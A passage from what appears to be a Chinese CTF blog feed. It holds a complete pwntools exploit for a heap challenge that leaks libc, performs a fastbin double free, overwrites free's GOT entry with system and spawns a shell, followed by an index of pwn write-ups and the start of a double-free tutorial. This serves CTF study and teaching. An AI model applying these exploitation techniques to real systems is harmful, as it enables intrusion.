class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="comment">#__author__:TaQini</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">local_file  = <span class="string">'./SCP_Foundation'</span></span><br><span class="line">local_libc  = <span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span></span><br><span class="line">remote_libc = <span class="string">'../../libc-2.23.so'</span></span><br><span class="line"></span><br><span class="line">is_local = <span class="literal">False</span></span><br><span class="line">is_remote = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(sys.argv) == <span class="number">1</span>:</span><br><span class="line">    is_local = <span class="literal">True</span></span><br><span class="line">    p = process(local_file)</span><br><span class="line">    libc = ELF(local_libc)</span><br><span class="line"><span class="keyword">elif</span> len(sys.argv) &gt; <span class="number">1</span>:</span><br><span class="line">    is_remote = <span class="literal">True</span></span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) == <span class="number">3</span>:</span><br><span class="line">        host = sys.argv[<span class="number">1</span>]</span><br><span class="line">        port = sys.argv[<span class="number">2</span>]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        host, port = sys.argv[<span class="number">1</span>].split(<span class="string">':'</span>)</span><br><span class="line">    p = remote(host, port)</span><br><span class="line">    libc = ELF(remote_libc)</span><br><span class="line"></span><br><span class="line">elf = ELF(local_file)</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.arch = elf.arch</span><br><span class="line"></span><br><span class="line">se      = <span class="keyword">lambda</span> data               :p.send(data) </span><br><span class="line">sa      = <span class="keyword">lambda</span> delim,data         :p.sendafter(delim, data)</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :p.sendline(data)</span><br><span class="line">sla     = <span class="keyword">lambda</span> delim,data         :p.sendlineafter(delim, data)</span><br><span class="line">sea     = <span class="keyword">lambda</span> delim,data         :p.sendafter(delim, data)</span><br><span class="line">rc      = <span class="keyword">lambda</span> numb=<span class="number">4096</span>          :p.recv(numb)</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims, drop=<span class="literal">True</span>  :p.recvuntil(delims, drop)</span><br><span class="line">uu32    = <span class="keyword">lambda</span> data               :u32(data.ljust(<span class="number">4</span>, <span class="string">'\0'</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data               :u64(data.ljust(<span class="number">8</span>, <span class="string">'\0'</span>))</span><br><span class="line">info_addr = <span class="keyword">lambda</span> tag, addr        :p.info(tag + <span class="string">': &#123;:#x&#125;'</span>.format(addr))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">(cmd=<span class="string">''</span>)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> is_local: gdb.attach(p,cmd)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(n_size, name, d_size, desc)</span>:</span></span><br><span class="line">    sla(<span class="string">'want to do :'</span>,<span class="string">'2'</span>)</span><br><span class="line">    sla(<span class="string">'&gt; SCP name\'s length : '</span>, str(n_size))</span><br><span class="line">    sea(<span class="string">'&gt; SCP name : '</span>,name)</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    sla(<span class="string">'length : '</span>,str(d_size))</span><br><span class="line">    sea(<span class="string">'SCP description : '</span>,desc)</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dlt</span><span class="params">(index)</span>:</span></span><br><span class="line">    sla(<span class="string">'want to do :'</span>,<span class="string">'4'</span>)</span><br><span class="line">    sla(<span class="string">'&gt; SCP project ID : '</span>,str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(index)</span>:</span></span><br><span class="line">    sla(<span class="string">'want to do :'</span>,<span class="string">'5'</span>)</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    sla(<span class="string">'&gt; SCP project ID : '</span>,str(index))</span><br><span class="line">    ru(<span class="string">'# SCP\'s name is '</span>)</span><br><span class="line">    <span class="keyword">return</span> rc(<span class="number">6</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">()</span>:</span></span><br><span class="line">    sla(<span class="string">'&gt; Username:'</span>,<span class="string">'TaQi'</span>)</span><br><span class="line">    sla(<span class="string">'&gt; Password:'</span>,<span class="string">'For_the_glory_of_Brunhild'</span>)</span><br><span class="line"></span><br><span class="line">login()</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x28</span>,<span class="string">'AAAAAAAA'</span>,<span class="number">0x58</span>,<span class="string">'aaaaaaaa'</span>) <span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x28</span>,<span class="string">'BBBBBBBB'</span>,<span class="number">0x58</span>,<span class="string">'bbbbbbbb'</span>) <span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x28</span>,<span class="string">'CCCCCCCC'</span>,<span class="number">0x58</span>,<span class="string">'cccccccc'</span>) <span class="comment">#2</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># leak libc</span></span><br><span class="line">dlt(<span class="number">0</span>)</span><br><span class="line">dlt(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x18</span>,p64(elf.got[<span class="string">'free'</span>]),<span class="number">0x18</span>,<span class="string">'dddddddd'</span>) <span class="comment">#3</span></span><br><span class="line">free = uu64(show(<span class="number">0</span>))</span><br><span class="line">libc_base = free - libc.sym[<span class="string">'free'</span>]</span><br><span class="line">info_addr(<span class="string">'libc_base'</span>,libc_base)</span><br><span class="line">system = libc_base + libc.sym[<span class="string">'system'</span>]</span><br><span class="line">dlt(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># double free</span></span><br><span class="line">dlt(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0x28</span>,p64(<span class="number">0xdeadbeef</span>),<span class="number">0x58</span>,p64(elf.got[<span class="string">'free'</span>]<span class="number">-16</span><span class="number">-14</span>)) <span class="comment">#4</span></span><br><span class="line">add(<span class="number">0x28</span>,p64(<span class="number">0xdeadbeef</span>),<span class="number">0x58</span>,<span class="string">'eeeeeeee'</span>) <span class="comment">#5</span></span><br><span class="line">add(<span class="number">0x28</span>,p64(<span class="number">0xdeadbeef</span>),<span class="number">0x58</span>,<span class="string">'ffffffff'</span>) <span class="comment">#6</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># overwrite free got</span></span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line">add(<span class="number">0x28</span>,<span class="string">'/bin/sh\0'</span>,<span class="number">0x58</span>,<span class="string">'a'</span>*<span class="number">14</span>+p64(system)) <span class="comment">#7</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># system('/bin/sh')</span></span><br><span class="line">dlt(<span class="number">7</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> uaf </tag>
            
            <tag> double free </tag>
            
            <tag> fastbin attack </tag>
            
            <tag> glibc heap </tag>
            
            <tag> writeup </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Pwn题目索引</title>
      <link href="/2020/02/22/index-of-pwn/"/>
      <url>/2020/02/22/index-of-pwn/</url>
      
        <content type="html"><![CDATA[<h1 id="Index-of-Pwn"><a href="#Index-of-Pwn" class="headerlink" title="Index of Pwn"></a>Index of Pwn</h1><ul><li>总结一些做过的经典Pwn题目~</li></ul><h2 id="Shellcode"><a href="#Shellcode" class="headerlink" title="Shellcode"></a>Shellcode</h2><table><thead><tr><th align="left">漏洞类型</th><th>知识点</th><th>传送门</th></tr></thead><tbody><tr><td align="left">栈溢出</td><td><code>ASCII shellcode</code> (by <code>alpha3</code>)</td><td><a href="https://github.com/TaQini/ctf/tree/master/anheng/2020NewYear/pwn/unctf_EasyShellcode" target="_blank" rel="noopener">EasyShellcode</a></td></tr><tr><td align="left">栈溢出</td><td><code>栈迁移</code>/<code>shellcode</code></td><td><a href="https://github.com/TaQini/ctf/tree/master/hgame2020/pwn/week1_2" target="_blank" rel="noopener">Number_Killer</a></td></tr><tr><td align="left">/</td><td><code>ASCII shellcode</code> (手动编码)</td><td><a href="https://github.com/TaQini/ctf/tree/master/buuctf/Xman_2018_pwn-base" target="_blank" rel="noopener">pwn-base</a></td></tr><tr><td align="left">/</td><td><code>nop sled</code></td><td><a href="https://github.com/TaQini/ctf/tree/master/MetasequoiaCTF/pwn/snow_mountain" target="_blank" rel="noopener">snow_mountain</a></td></tr><tr><td align="left">…</td><td>…</td><td>…</td></tr></tbody></table><h2 id="ROP"><a href="#ROP" class="headerlink" title="ROP"></a>ROP</h2><table><thead><tr><th align="left">漏洞类型</th><th>知识点</th><th>传送门</th></tr></thead><tbody><tr><td align="left"><code>bof</code></td><td>变量覆盖</td><td><a href="https://github.com/TaQini/ctf/tree/master/GXY_CTF_2019/pwn/my_cannary" target="_blank" rel="noopener">my_cannary</a></td></tr><tr><td align="left"><code>bof</code></td><td>无符号整数</td><td><a href="https://github.com/TaQini/ctf/tree/master/BJDCTF/pwn/babystack2" target="_blank" rel="noopener">babystack2</a>/<a href="https://github.com/TaQini/ctf/tree/master/MetasequoiaCTF/pwn/blacksmith" target="_blank" rel="noopener">blacksmith</a></td></tr><tr><td align="left">数组越界</td><td>盲打</td><td><a href="https://github.com/TaQini/ctf/tree/master/GXY_CTF_2019/pwn/blind_note" target="_blank" rel="noopener">blind_note</a></td></tr><tr><td align="left">数组越界</td><td>/</td><td><a href="https://github.com/TaQini/ctf/tree/master/adworld/pwn/challenge/stack2" target="_blank" rel="noopener">stack2</a></td></tr><tr><td align="left"><code>fsb</code>+<code>bof</code></td><td>泄漏canary</td><td><a href="https://github.com/TaQini/ctf/tree/master/BJDCTF/pwn/babyrop2" target="_blank" rel="noopener">babyrop2</a></td></tr><tr><td align="left"><code>fsb</code>+<code>bof</code></td><td><code>printf_chk(&quot;%a&quot;)</code>/<code>do-while</code></td><td><a href="https://github.com/TaQini/ctf/tree/master/ACTF2020/pwn/unsolved/chk_rop" target="_blank" rel="noopener">chk_rop</a></td></tr><tr><td align="left"><code>bof</code></td><td><code>ret2dl_resolve</code></td><td><a href="https://github.com/TaQini/ctf/tree/master/r2dl" target="_blank" rel="noopener">bof</a></td></tr><tr><td align="left"><code>bof</code></td><td>爆破+<code>ret2dl_resolve</code></td><td><a href="https://github.com/TaQini/ctf/tree/master/京津冀2019线下" target="_blank" rel="noopener">stack</a></td></tr><tr><td align="left"><code>bof</code>(<code>8 bytes</code>)</td><td>栈迁移</td><td><a href="https://github.com/TaQini/ctf/tree/master/adworld/pwn/challenge/welpwn" target="_blank" rel="noopener">welpwn</a></td></tr><tr><td align="left"><code>bof</code>(<code>8 bytes</code>)</td><td>栈迁移+<code>seccomp(0x3b)</code></td><td><a href="https://github.com/TaQini/ctf/tree/master/hgame2020/pwn/week3_1" target="_blank" rel="noopener">ROP</a></td></tr><tr><td align="left"><code>bof</code>+栈地址泄漏</td><td>栈迁移(扩大栈空间)</td><td><a href="https://github.com/TaQini/ctf/tree/master/buuctf/ciscn/es2" target="_blank" rel="noopener">es2</a></td></tr><tr><td align="left">…</td><td>…</td><td>…</td></tr></tbody></table><h2 id="One-Gadget"><a href="#One-Gadget" class="headerlink" title="One Gadget"></a>One Gadget</h2><table><thead><tr><th>漏洞类型</th><th>知识点</th><th>传送门</th></tr></thead><tbody><tr><td>栈泄漏+改写</td><td>one_gadget</td><td><a href="https://github.com/TaQini/ctf/tree/master/hgame2020/pwn/week2_4" target="_blank" rel="noopener">week2_4</a></td></tr><tr><td>…</td><td>…</td><td>…</td></tr></tbody></table><h2 id="GOT-overwrite"><a href="#GOT-overwrite" class="headerlink" title="GOT overwrite"></a>GOT overwrite</h2><table><thead><tr><th>漏洞类型</th><th>知识点</th><th>传送门</th></tr></thead><tbody><tr><td>任意写</td><td>GOT覆写</td><td><a href="https://github.com/TaQini/ctf/tree/master/hgame2020/pwn/week2_3" target="_blank" rel="noopener">week2_3</a></td></tr><tr><td>…</td><td>…</td><td>…</td></tr></tbody></table><h2 id="Format-String"><a href="#Format-String" class="headerlink" title="Format String"></a>Format String</h2><table><thead><tr><th>漏洞类型</th><th>知识点</th><th>传送门</th></tr></thead><tbody><tr><td><code>fsb</code></td><td><code>%n</code></td><td><a href="https://github.com/TaQini/ctf/tree/master/adworld/pwn/exercise/CGfsb" target="_blank" rel="noopener">CGfsb</a>/<a href="https://github.com/TaQini/ctf/tree/master/ACTF2020/pwn/fmt32" target="_blank" rel="noopener">fmt32</a></td></tr><tr><td><code>fsb</code>+<code>bof</code></td><td>泄漏canary</td><td><a href="https://github.com/TaQini/ctf/tree/master/BJDCTF/pwn/babyrop2" target="_blank" rel="noopener">babyrop2</a></td></tr><tr><td><code>fsb</code></td><td>[全保护]修改libc函数指针/<code>free_hook</code></td><td><a href="https://github.com/TaQini/ctf/tree/master/ACTF2020/pwn/fmt64" target="_blank" rel="noopener">fmt64</a></td></tr><tr><td>…</td><td>…</td><td>…</td></tr></tbody></table><h2 id="Double-free"><a href="#Double-free" class="headerlink" title="Double free"></a>Double free</h2><table><thead><tr><th>漏洞类型</th><th>知识点</th><th>传送门</th></tr></thead><tbody><tr><td><code>double free</code></td><td>伪造chunk</td><td><a href="https://github.com/TaQini/ctf/tree/master/MetasequoiaCTF/pwn/samsara" target="_blank" rel="noopener">samsara</a></td></tr><tr><td><code>double free</code></td><td><code>unsorted bin leak</code></td><td><a href="https://github.com/TaQini/ctf/tree/master/hgame2020/pwn/week2_2" target="_blank" rel="noopener">week2_2</a></td></tr><tr><td>…</td><td>…</td><td>…</td></tr></tbody></table><h2 id="fastbin-attack"><a href="#fastbin-attack" class="headerlink" title="fastbin attack"></a>fastbin attack</h2><table><thead><tr><th>漏洞类型</th><th>知识点</th><th>传送门</th></tr></thead><tbody><tr><td>fastbin attack</td><td>malloc内存分配机制</td><td><a href="https://github.com/TaQini/ctf/tree/master/MetasequoiaCTF/pwn/Summoner" target="_blank" rel="noopener">Summoner</a></td></tr><tr><td></td><td></td><td></td></tr><tr><td>…</td><td>…</td><td>…</td></tr></tbody></table><h2 id="IO-FILE-attack"><a href="#IO-FILE-attack" class="headerlink" title="IO_FILE attack"></a>IO_FILE attack</h2><table><thead><tr><th>漏洞类型</th><th>知识点</th><th>传送门</th></tr></thead><tbody><tr><td>数组越界</td><td>修改IO_FILE</td><td><a href="https://github.com/TaQini/ctf/tree/master/ACTF2020/pwn/complaint" target="_blank" rel="noopener">complaint</a></td></tr><tr><td></td><td></td><td></td></tr><tr><td>…</td><td>…</td><td>..</td></tr></tbody></table><h2 id="About-Linux-shell-cmd"><a href="#About-Linux-shell-cmd" class="headerlink" title="About Linux shell cmd"></a>About Linux shell cmd</h2><table><thead><tr><th>漏洞类型</th><th>知识点</th><th>传送门</th></tr></thead><tbody><tr><td>/</td><td>绕过命令过滤+<code>stdout</code>重定向+<code>ls -i</code>命令</td><td><a href="hgame2020/pwn/week2_1">find_yourself</a></td></tr><tr><td>命令注入</td><td>逆向分析+指令链接符号 <code>;</code></td><td><a href="https://github.com/TaQini/ctf/tree/master/BJDCTF/pwn/dizzy" target="_blank" rel="noopener">dizzy</a></td></tr><tr><td>命令注入</td><td>指令链接符号 <code>;</code></td><td><a href="https://github.com/TaQini/ctf/tree/master/BJDCTF/pwn/babyrouter" target="_blank" rel="noopener">babyrouter</a></td></tr><tr><td>…</td><td>…</td><td>…</td></tr></tbody></table><h2 id="Statically-Linked"><a href="#Statically-Linked" class="headerlink" title="Statically Linked"></a>Statically Linked</h2><table><thead><tr><th>漏洞类型</th><th>知识点</th><th>传送门</th></tr></thead><tbody><tr><td>栈溢出</td><td><code>mprotect</code>/<code>ROPgadget --static</code>/<code>ROP</code></td><td><a href="https://github.com/TaQini/ctf/tree/master/buuctf/3dsctf_2016" target="_blank" rel="noopener">3dsctf_2016</a></td></tr><tr><td>任意写</td><td><code>ROP</code>/<code>fini_array劫持</code>/<code>栈迁移</code></td><td><a href="https://github.com/TaQini/ctf/tree/master/pwnable_tw/3x17" target="_blank" rel="noopener">3x17</a></td></tr><tr><td>…</td><td>…</td><td>…</td></tr></tbody></table><h2 id="Other"><a href="#Other" class="headerlink" title="Other"></a>Other</h2><table><thead><tr><th>漏洞类型</th><th>知识点</th><th>传送门</th></tr></thead><tbody><tr><td>缓冲区溢出</td><td>变量覆盖+<code>ctypes</code>调用<code>Libc</code>函数</td><td><a href="https://github.com/TaQini/ctf/tree/master/adworld/pwn/exercise/guess_num" target="_blank" rel="noopener">guess_num</a></td></tr><tr><td>路径穿越</td><td>(WEB) HTTP协议</td><td><a href="https://github.com/TaQini/ctf/tree/master/GXY_CTF_2019/pwn/httpd" target="_blank" rel="noopener">httpd</a></td></tr><tr><td>栈溢出</td><td>(Crypto) RSA加密</td><td><a href="https://github.com/BjdsecCA/BJDCTF2020/tree/master/Pwn/encrypted_stack/poc" target="_blank" rel="noopener">encrypted_stack</a></td></tr><tr><td>…</td><td>…</td><td>…</td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> pwn总结 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Fastbin Double free 知识点总结</title>
      <link href="/2020/02/22/Double-free/"/>
      <url>/2020/02/22/Double-free/</url>
      
        <content type="html"><![CDATA[<p><code>fastbin double free</code> 是<code>fastbin attack</code>的一种，在<code>glibc heap</code>相关的漏洞中是较为常见也比较基础的。</p><h1 id="原理-Ref１-Ref2-Ref3"><a href="#原理-Ref１-Ref2-Ref3" class="headerlink" title="原理(Ref１,Ref2,Ref3)"></a>原理(<a href="https://zhuanlan.zhihu.com/p/64434547" target="_blank" rel="noopener">Ref１</a>,<a href="https://paper.seebug.org/445/" target="_blank" rel="noopener">Ref2</a>,<a href="https://xz.aliyun.com/t/6342" target="_blank" rel="noopener">Ref3</a>)</h1><h2 id="0-基础知识"><a href="#0-基础知识" class="headerlink" title="0 基础知识"></a>0 基础知识</h2><ol start="0"><li><p>malloc chunk结构：</p> <div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span> &#123;</span></span><br><span class="line">    INTERNAL_SIZE_T prev_size;  <span class="comment">/*前一个chunk的大小*/</span></span><br><span class="line">    INTERNAL_SIZE_T <span class="built_in">size</span>;       <span class="comment">/*当前chunk的大小*/</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span> * <span class="title">fd</span>;</span>   <span class="comment">/*指向前一个释放的chunk*/</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span> * <span class="title">bk</span>;</span>   <span class="comment">/*指向后一个释放的chunk*/</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p> An allocated chunk looks like this:</p> <div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">    chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">            |             Size of previous chunk, if unallocated (P clear)  |</span><br><span class="line">            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">            |             Size of chunk, in bytes                     |A|M|P|</span><br><span class="line">      mem-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">            |             User data starts here...                          .</span><br><span class="line">            .                                                               .</span><br><span class="line">            .             (malloc_usable_size() bytes)                      .</span><br><span class="line">            .                                                               |</span><br><span class="line">nextchunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">            |             (size of chunk, but used for application data)    |</span><br><span class="line">            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">            |             Size of next chunk, in bytes                |A|0|1|</span><br><span class="line">            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br></pre></td></tr></table></figure></div><p> Free chunks are stored in circular doubly-linked lists, and look like this:</p> <div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">    chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">            |             Size of previous chunk, if unallocated (P clear)  |</span><br><span class="line">            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">    &#96;head:&#39; |             Size of chunk, in bytes                     |A|0|P|</span><br><span class="line">      mem-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">            |             Forward pointer to next chunk in list             |</span><br><span class="line">            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">            |             Back pointer to previous chunk in list            |</span><br><span class="line">            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">            |             Unused space (may be 0 bytes long)                .</span><br><span class="line">            .                                                               .</span><br><span class="line">            .                                                               |</span><br><span class="line">nextchunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">    &#96;foot:&#39; |             Size of chunk, in bytes                           |</span><br><span class="line">            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">            |             Size of next chunk, in bytes                |A|0|0|</span><br><span class="line">            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br></pre></td></tr></table></figure></div></li></ol><ol><li><p><code>fast chunk</code> 表示正在使用的长度在<code>0x20-0x80</code>的堆块</p><p><code>fastbin</code> 表示长度在<code>0x20-0x80</code>范围内的已经释放的堆块</p></li><li><p><code>fast chunk</code> 没有fd，只有prev_size、size、data。</p><p><code>fastbin</code> 只有 fd 指针，fd指向下一个<code>fastbin</code>，且标志位P=1，且(P=0表示前一个chunk空闲)</p></li><li><p><code>fastbin</code> 由单链表构成，采用 LIFO， chunk 从链表头部插入，从头部取出。</p></li></ol><h2 id="1-利用原理"><a href="#1-利用原理" class="headerlink" title="1 利用原理"></a>1 利用原理</h2><h3 id="什么是-double-free"><a href="#什么是-double-free" class="headerlink" title="什么是 double free"></a>什么是 double free</h3><p>释放一个 chunk 两次。</p><h3 id="double-free-能干什么"><a href="#double-free-能干什么" class="headerlink" title="double free 能干什么"></a>double free 能干什么</h3><p>能造成<code>malloc()</code>到同一个 chunk，造成混乱。如果利用得当，就可以达到<strong>任意地址写</strong>的目的。</p><h3 id="怎么利用-double-free"><a href="#怎么利用-double-free" class="headerlink" title="怎么利用 double free"></a>怎么利用 double free</h3><p>在<code>malloc()</code>时，当用户所要求内存大小在 fastbin 的大小范围时，<code>malloc()</code>优先从 fastbin 中拿出 chunk。<code>malloc()</code>会查找与所要求大小相匹配的 fastbin 链表，然后从头部取出 chunk，并将取出 chunk 的 fd 赋给 fastbin 链表头部。这样就从 fastbin 链表的头部中取出了 chunk。</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>)(nb) &lt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>)(get_max_fast()))</span><br><span class="line">  &#123;</span><br><span class="line">    idx = fastbin_index(nb);</span><br><span class="line">    mfastbinptr *fb = &amp;fastbin(av, idx);</span><br><span class="line">    mchunkptr pp;</span><br><span class="line">    victim = *fb;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (victim != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (SINGLE_THREAD_P)</span><br><span class="line">        *fb = victim-&gt;fd;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        REMOVE_FB(fb, pp, victim);</span><br><span class="line">      <span class="keyword">if</span> (__glibc_likely(victim != <span class="literal">NULL</span>))</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">size_t</span> victim_idx = fastbin_index(chunksize(victim));</span><br><span class="line">        <span class="keyword">if</span> (__builtin_expect(victim_idx != idx, <span class="number">0</span>))</span><br><span class="line">          malloc_printerr(<span class="string">"malloc(): memory corruption (fast)"</span>);</span><br><span class="line">        check_remalloced_chunk(av, victim, nb);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line"><span class="comment">// 这里不是重点，所以省略了</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">        <span class="keyword">void</span> *p = chunk2mem(victim);</span><br><span class="line">        alloc_perturb(p, bytes);</span><br><span class="line">        <span class="keyword">return</span> p;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></div><p>由于<code>free()</code>时候检查了 fastbin 头部指向的 chunk 和被<code>free()</code>的 chunk 是否相等，即检查是否两次<code>free()</code>了同一个 chunk。所以不能通过直接<code>free()</code>同一个 chunk 来进行 double free。</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> <span 